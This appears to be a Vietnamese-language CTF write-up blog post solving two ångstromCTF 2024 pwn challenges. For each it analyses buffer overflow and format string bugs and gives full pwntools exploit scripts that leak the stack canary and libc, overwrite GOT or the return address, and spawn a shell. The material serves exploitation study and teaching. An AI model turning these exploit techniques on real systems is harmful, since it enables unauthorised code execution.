---
title: "[WRITE UP] - ångstromCTF 2024"
published: 2024-12-01
description: "Write up for ångstromCTF pwn challenge"
image: "./image.png"
tags:
  - "PWN"
category: "CTF Write ups"
draft: false
---

# og

## General Information

```bash
alter ^ Sol in ~/pwn/Practice/og
$ checksec og
[*] '/home/alter/pwn/Practice/og/og'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
alter ^ Sol in ~/pwn/Practice/og
$ file og
og: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=42dbf927622b136a955ad18f3fbf77f8f83a586a, for GNU/Linux 3.2.0, not stripped
```

- **main()**

    ```python
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      go(argc, argv, envp);
      return 0;
    }
    ```

- **go()**

    ```python
    unsigned __int64 go()
    {
      char name[40]; // [rsp+0h] [rbp-30h] BYREF
      unsigned __int64 v2; // [rsp+28h] [rbp-8h]

      v2 = __readfsqword(0x28u);
      setbuf(stdin, 0LL);
      setbuf(stdout, 0LL);
      setbuf(stderr, 0LL);
      printf("kill $PPID; Enter your name: ");
      fgets(name, 66, stdin);
      printf("Gotta go. See you around, ");
      printf(name);
      return v2 - __readfsqword(0x28u);
    }
    ```


Một chương trình khá simple khi ta có thể nhập input vào biến `name` , và chương trình sẽ in ra những gì ta nhập. Sau khi nhập xong chương trình sẽ return về main và exit

### Bug

- Hàm `fgets` cho phép nhập tối đa **`66 byte`** vào biến `name`, nhưng biến `name` chỉ được cấp phát **`40 byte`** trên stack → **`Buffer Overflow`**
- Hàm `printf` in trực tiếp nội dung của biến `name` mà không kiểm tra định dạng → **`Format String`**
- Do chương trình sử dụng **`Partial RELRO`**, bảng GOT (`Global Offset Table`) vẫn có quyền ghi (`rw-`) → **`GOT Overwrite`**

## Exploit

Do chương trình này lấy `input` của ta xong nó sẽ exit luôn nên chúng ta sẽ tìm cách để cho nó thực hiện lại được nhiều lần

### Leak & return to main

Ở đây ta có thể tận dụng `Format String` để vừa leak vừa cho nó `return` . Nhưng để căn chỉnh `payload` cho phù hợp ta cần phải debug:

```nasm
pwndbg> r
0x0000000000401214 in go ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0x7fffffffdc10 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
 RBX  0
 RCX  0x7ffff7e9b887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7ffff7fa1aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
*RDI  0x7fffffffdc10 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
 RSI  0x42
 R8   0x1d
 R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
 R10  0x402004 ◂— 'kill $PPID; Enter your name: '
 R11  0x246
 R12  0x7fffffffdd68 —▸ 0x7fffffffdffd ◂— '/home/alter/pwn/Practice/og/og'
 R13  0x401255 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdc40 —▸ 0x7fffffffdc50 ◂— 1
 RSP  0x7fffffffdc10 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
*RIP  0x401214 (go+126) ◂— call fgets@plt
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
   0x4011fc <go+102>    call   printf@plt                  <printf@plt>

   0x401201 <go+107>    mov    rdx, qword ptr [rip + 0x2e68]     RDX, [stdin@GLIBC_2.2.5] => 0x7ffff7fa1aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
   0x401208 <go+114>    lea    rax, [rbp - 0x30]                 RAX => 0x7fffffffdc10 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
   0x40120c <go+118>    mov    esi, 0x42                         ESI => 0x42
   0x401211 <go+123>    mov    rdi, rax                          RDI => 0x7fffffffdc10 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
 ► 0x401214 <go+126>    call   fgets@plt                   <fgets@plt>
        s: 0x7fffffffdc10 —▸ 0x7ffff7fc1000 ◂— 0x10102464c457f
        n: 0x42
        stream: 0x7ffff7fa1aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b

   0x401219 <go+131>    lea    rax, [rip + 0xe02]     RAX => 0x402022 ◂— 'Gotta go. See you around, '
   0x401220 <go+138>    mov    rdi, rax
   0x401223 <go+141>    mov    eax, 0                 EAX => 0
   0x401228 <go+146>    call   printf@plt                  <printf@plt>

   0x40122d <go+151>    lea    rax, [rbp - 0x30]
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rax rdi rsp 0x7fffffffdc10 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
01:0008│-028         0x7fffffffdc18 ◂— 0x10101000000
02:0010│-020         0x7fffffffdc20 ◂— 2
03:0018│-018         0x7fffffffdc28 ◂— 0x178bfbff
04:0020│-010         0x7fffffffdc30 —▸ 0x7fffffffdfe9 ◂— 0x34365f363878 /* 'x86_64' */
05:0028│-008         0x7fffffffdc38 ◂— 0xb2a957089e3d2e00
06:0030│ rbp         0x7fffffffdc40 —▸ 0x7fffffffdc50 ◂— 1
07:0038│+008         0x7fffffffdc48 —▸ 0x401267 (main+18) ◂— mov eax, 0
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0         0x401214 go+126
   1         0x401267 main+18
   2   0x7ffff7db0d90 __libc_start_call_main+128
   3   0x7ffff7db0e40 __libc_start_main+128
   4         0x4010d5 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> tel
00:0000│ rax rdi rsp 0x7fffffffdc10 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
01:0008│-028         0x7fffffffdc18 ◂— 0x10101000000
02:0010│-020         0x7fffffffdc20 ◂— 2
03:0018│-018         0x7fffffffdc28 ◂— 0x178bfbff
04:0020│-010         0x7fffffffdc30 —▸ 0x7fffffffdfe9 ◂— 0x34365f363878 /* 'x86_64' */
05:0028│-008         0x7fffffffdc38 ◂— 0xb2a957089e3d2e00
06:0030│ rbp         0x7fffffffdc40 —▸ 0x7fffffffdc50 ◂— 1
07:0038│+008         0x7fffffffdc48 —▸ 0x401267 (main+18) ◂— mov eax, 0
pwndbg>
08:0040│+010 0x7fffffffdc50 ◂— 1
09:0048│+018 0x7fffffffdc58 —▸ 0x7ffff7db0d90 (__libc_start_call_main+128) ◂— mov edi, eax
0a:0050│+020 0x7fffffffdc60 ◂— 0
0b:0058│+028 0x7fffffffdc68 —▸ 0x401255 (main) ◂— endbr64
0c:0060│+030 0x7fffffffdc70 ◂— 0x1ffffdd50
0d:0068│+038 0x7fffffffdc78 —▸ 0x7fffffffdd68 —▸ 0x7fffffffdffd ◂— '/home/alter/pwn/Practice/og/og'
0e:0070│+040 0x7fffffffdc80 ◂— 0
0f:0078│+048 0x7fffffffdc88 ◂— 0x2b51fcae0b81da7c
pwndbg> p/d (0x7fffffffdc38-0x7fffffffdc10)/8 + 6
$1 = 11
```

Chúng ta có thể leak giá trị `canary` tại index `11` và địa chỉ của `__libc_start_call_main+128` tại index `15`. Tuy nhiên, thay vì leak canary tại index 11, ta sẽ leak canary ở stack của hàm `main` (hàm cha gọi `go`). Giá trị canary của hàm `go` và hàm `main` giống nhau vì **canary là một giá trị toàn cục**, được khởi tạo một lần duy nhất khi chương trình bắt đầu thực thi. Tất cả các hàm trong cùng một luồng thực thi (thread) đều sử dụng chung giá trị canary để bảo vệ stack của chúng. Khi hàm `main` gọi `go`, stack frame của `go` được đặt ngay phía trên stack frame của `main`, và giá trị canary từ `main` được sao chép sang stack của `go`. Điều này đảm bảo cả hai stack frame đều được bảo vệ bởi cùng một giá trị canary, giúp phát hiện các cuộc tấn công ghi đè bộ nhớ.

Việc leak canary từ stack của `main` cho phép ta ghi đè một phần giá trị canary của `go`, dẫn đến việc ép chương trình gọi `__stack_chk_fail@plt`. Tận dụng lỗ hổng format string, ta sẽ ghi đè địa chỉ của `__stack_chk_fail` thành địa chỉ của hàm `main`, từ đó đưa chương trình quay lại `main` để tiếp tục khai thác và mở rộng khả năng kiểm soát flow của chương trình.

```nasm
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/alter/pwn/Practice/og/og:
GOT protection: Partial RELRO | Found 4 GOT entries passing the filter
[0x404018] __stack_chk_fail@GLIBC_2.4 -> 0x401030 ◂— endbr64
[0x404020] setbuf@GLIBC_2.2.5 -> 0x7ffff7e0efe0 (setbuf) ◂— endbr64
[0x404028] printf@GLIBC_2.2.5 -> 0x7ffff7de76f0 (printf) ◂— endbr64
[0x404030] fgets@GLIBC_2.2.5 -> 0x401060 ◂— endbr64
pwndbg> p&main
$2 = (<text variable, no debug info> *) 0x401255 <main>
pwndbg> plt
Section .plt 0x401020-0x401070:
No symbols found in section .plt
```

Ta có thể thấy vì `__stack_chk_fail` chưa được gọi nên địa chỉ trong `GOT` của nó vẫn còn nằm trong range của `PLT` . Và so sánh với địa chỉ của `main` ta thấy do `PIE` tắt nên địa chỉ của `main` cũng chỉ dao động trong khoảng `3` bytes nên ta có thể cắt 2 bytes cuối của `main` và ghi nó vô `__stack_chk_fail@plt`  bằng `format string`

- **Part 1 of exploit**

    ```python
    # [1]: Leak & return
    ret_addr = (exe.sym.main) & 0xffff

    pl = f'%{ret_addr}c%10$hn'.encode()
    pl += f'%15$p%33$p'.encode()
    pl = pl.ljust(0x20, b'\0')
    pl += p64(exe.got.__stack_chk_fail)
    sla(b'name: ', pl)

    ru(b'0x')
    leak = int(ru(b'0x',drop=True), 16)
    canary = int(ru(b'A', drop=True), 16)
    libc.address = leak - 0x29d90
    info('Canary: ' + hex(canary))
    info('Libc leak: ' + hex(leak))
    info('Libc address: ' + hex(libc.address))
    ```



:::note
Ta nên setup thêm cho payload `Format String` khoảng từ `0x10-0x30` bytes khoảng trống, để tránh các dữ liệu không đáng muốn bị chèn vào
:::

### Get shell

Khi đã có data được leak hết rồi thì ta dễ dàng dùng `Buffer Overflow` để get shell. Ở đây mình sẽ dùng `onegadget`  vì với input size là `66` thì không đủ để chứa full payload để gọi hàm `system` của ta được.

```bash
alter ^ Sol in ~/pwn/Practice/og
$ one_gadget libc.so.6
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
alter ^ Sol in ~/pwn/Practice/og
```

- **Part 2 of exploit (test)**

    ```bash
    # [2]: Get shell
    one_gadget = libc.address + 0xebc85
    pl = b'\0'*0x28 + p64(canary) + p64(0) +p64(one_gadget)
    sla(b'name: ', pl)
    ```


Vì ở đây các `constraints` của `onegadget` yêu cầu phải có một địa chỉ `writeable`  nên ta không thể set `saved rbp` là `0` được, thay vào đó phải là một vùng nhớ có quyền `write`

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /home/alter/pwn/Practice/og/og
          0x401000           0x402000 r-xp     1000   1000 /home/alter/pwn/Practice/og/og
          0x402000           0x403000 r--p     1000   2000 /home/alter/pwn/Practice/og/og
          0x403000           0x404000 r--p     1000   2000 /home/alter/pwn/Practice/og/og
          0x404000           0x405000 rw-p     1000   3000 /home/alter/pwn/Practice/og/og
<...>
pwndbg> x/50xg 0x404000
0x404000:       0x0000000000403e20      0x00007ffff7ffe2e0
0x404010:       0x00007ffff7fd8d30      0x0000000000401030
0x404020 <setbuf@got.plt>:      0x00007ffff7e0efe0      0x00007ffff7de76f0
0x404030 <fgets@got.plt>:       0x0000000000401060      0x0000000000000000
0x404040:       0x0000000000000000      0x0000000000000000
0x404050:       0x0000000000000000      0x0000000000000000
0x404060 <stdout@GLIBC_2.2.5>:  0x00007ffff7fa2780      0x0000000000000000
0x404070 <stdin@GLIBC_2.2.5>:   0x00007ffff7fa1aa0      0x0000000000000000
0x404080 <stderr@GLIBC_2.2.5>:  0x00007ffff7fa26a0      0x0000000000000000
0x404090:       0x0000000000000000      0x0000000000000000
0x4040a0:       0x0000000000000000      0x0000000000000000
0x4040b0:       0x0000000000000000      0x0000000000000000
0x4040c0:       0x0000000000000000      0x0000000000000000
0x4040d0:       0x0000000000000000      0x0000000000000000
0x4040e0:       0x0000000000000000      0x0000000000000000
<...>
0x404320:       0x0000000000000000      0x0000000000000000
0x404330:       0x0000000000000000      0x0000000000000000
0x404340:       0x0000000000000000      0x0000000000000000
0x404350:       0x0000000000000000      0x0000000000000000
0x404360:       0x0000000000000000      0x0000000000000000
0x404370:       0x0000000000000000      0x0000000000000000
0x404380:       0x0000000000000000      0x0000000000000000
0x404390:       0x0000000000000000      0x0000000000000000
0x4043a0:       0x0000000000000000      0x0000000000000000
0x4043b0:       0x0000000000000000      0x0000000000000000
0x4043c0:       0x0000000000000000      0x0000000000000000
0x4043d0:       0x0000000000000000      0x0000000000000000
0x4043e0:       0x0000000000000000      0x0000000000000000
0x4043f0:       0x0000000000000000      0x0000000000000000
0x404400:       0x0000000000000000      0x0000000000000000
0x404410:       0x0000000000000000      0x0000000000000000
0x404420:       0x0000000000000000      0x0000000000000000
<...>
```

- **Full exploit**

    ```python
    #!/usr/bin/python3
    from pwncus import *
    from time import sleep

    # context.log_level = 'debug'
    exe = context.binary = ELF('./og', checksec=False)
    libc = ELF('libc.so.6', checksec=False)

    def GDB(): gdb.attach(p, gdbscript='''

    b*go+131
    b*go+168
    b*go+190
    c
    ''') if not args.REMOTE else None

    if args.REMOTE:
        con = sys.argv[1:]
        p = remote(con[0], int(con[1]))
    else:
        p = process(argv=[exe.path], aslr=False)
    set_p(p)
    if args.GDB: GDB(); input()

    # ===========================================================
    #                          EXPLOIT
    # ===========================================================

    def exploit():

        # [1]: Leak libc & canary & ret2main
        ret_addr = (exe.sym.main) & 0xffff

        pl = f'%{ret_addr}c%10$hn'.encode()
        pl += f'%15$p%33$p'.encode()
        pl = pl.ljust(0x20, b'\0')
        pl += p64(exe.got.__stack_chk_fail)
        sla(b'name: ', pl)

        ru(b'0x')
        leak = int(ru(b'0x',drop=True), 16)
        canary = int(ru(b'A', drop=True), 16)
        libc.address = leak - 0x29d90
        info('Canary: ' + hex(canary))
        info('Libc leak: ' + hex(leak))
        info('Libc address: ' + hex(libc.address))

        # [2]: Get shell
        one_gadget = libc.address + 0xebc85
        pl = b'\0'*0x28 + p64(canary) + p64(0x4044b0) +p64(one_gadget)
        sla(b'name: ', pl)

        interactive()

    if __name__ == '__main__':
        exploit()
    ```

# bap

## Source

[bap.zip](bap.zip)

## General information

```bash
[*] '/home/alter/pwn/Practice/bap/bap'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format[16]; // [rsp+0h] [rbp-10h] BYREF

  setbuf(_bss_start, 0LL);
  printf(": ");
  gets(format);
  return printf(format);
}
```

Ở đây ta dễ dàng thấy đoạn mã trên chứa hai lỗi  **Buffer Overflow** và **Format String Vulnerability**. Hàm `gets()` được sử dụng để đọc đầu vào từ người dùng, nhưng không giới hạn độ dài dữ liệu nhập, dẫn đến khả năng **Buffer Overflow** khi nhập nhiều hơn 16 ký tự, ghi đè lên stack và có thể kiểm soát luồng thực thi. Tiếp theo, dữ liệu được in ra bằng hàm `printf(format)`, nơi giá trị của `format` hoàn toàn do người dùng kiểm soát.

## Leak libc

Như ở trên chúng ta đã phân tích, format là hoàn toàn do chúng ta kiểm soát, nên ta có thể tận dụng nó để leak bất kì dữ liệu nào mà ta muốn nhờ vào `%p` và `%s` . Nhưng ở đây chúng ta không thể leak được `__libc_start_main` vì cơ bản nếu ta leak được nó thì chương trình sẽ end luôn và không cho ta làm gì tiếp theo, cho nên việc đầu tiên ta cần làm là `return to main`  để nó quay về hàm `main` một lần nữa (biện pháp leak libc thay thế là ta có thể dùng bảng GOT), điều này khá tiện cho việc setup payload của ta về sau. Ở đây mình sẽ vừa `leak` dữ liệu và vừa cho nó `return to main` luôn làm như vậy sẽ lẹ hơn. Như vậy mình sẽ overwrite `saved RIP` bằng địa chỉ của hàm `main` và ở `rbp+0x10` mình sẽ để địa chỉ của `gets.got` . Và tiếp đến dùng GDB để xác định xem payload format string ta cần sử dụng để leak là gì:

```bash
00:0000│ rax rsp 0x7fffffffdc40 ◂— 0x6f6c6c6568 /* 'hello' */
01:0008│-008     0x7fffffffdc48 —▸ 0x401090 (_start) ◂— endbr64
02:0010│ rbp     0x7fffffffdc50 ◂— 1
03:0018│+008     0x7fffffffdc58 —▸ 0x7ffff7db0d90 (__libc_start_call_main+128) ◂— mov edi, eax
04:0020│+010     0x7fffffffdc60 ◂— 0
```

Bằng một phép tính đơn giản (hoặc đếm) thì ta có thể xác định được `number` ta sử dụng là `11` → `%11$s` . Vậy payload của ta đoạn nãy sẽ trông như thế này:

```python
ret = 0x000000000040101a
pop_rdi = 0x000000000002a3e5

pl = b'%11$s' + b'A' * 19
pl += p64(ret) + p64(exe.sym.main) + p64(exe.got.gets)
sla(b': ',pl)

leak = u64(ru(b'A')[:-1] + b'\0\0')
libc.address = leak - libc.sym.gets
info('Leak: ' + hex(leak))
info('Libc base: ' + hex(libc.address))
```

## Get shell

Có `libc base` rồi thì việc get shell khá đơn giản:

```python
pl = b'B'*24
pl += p64(ret)
pl += p64(libc.address + pop_rdi) + p64(next(libc.search(b'/bin/sh')))
pl += p64(libc.sym.system)
sla(b': ',pl)
```

- **Full payload**

    ```python
    #!/usr/bin/python3
    from pwncus import *
    from time import sleep

    # context.log_level = 'debug'
    exe = context.binary = ELF('./bap_patched', checksec=False)
    libc = ELF('libc.so.6', checksec=False)

    def GDB(): gdb.attach(p, gdbscript='''

    b*main+69
    b*main+81
    c
    ''') if not args.REMOTE else None

    p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
    set_p(p)
    if args.GDB: GDB(); input()

    # ===========================================================
    #                          EXPLOIT
    # ===========================================================

    '''
    [*] '/home/alter/pwn/Practice/bap/bap'
        Arch:       amd64-64-little
        RELRO:      Full RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x400000)
        SHSTK:      Enabled
        IBT:        Enabled
        Stripped:   No
    '''
    ret = 0x000000000040101a
    pop_rdi = 0x000000000002a3e5

    pl = b'%11$s' + b'A' * 19
    pl += p64(ret) + p64(exe.sym.main) + p64(exe.got.gets)
    sla(b': ',pl)

    leak = u64(ru(b'A')[:-1] + b'\0\0')
    libc.address = leak - libc.sym.gets
    info('Leak: ' + hex(leak))
    info('Libc base: ' + hex(libc.address))

    pl = b'B'*24
    pl += p64(ret)
    pl += p64(libc.address + pop_rdi) + p64(next(libc.search(b'/bin/sh')))
    pl += p64(libc.sym.system)
    sla(b': ',pl)

    interactive()

    ```
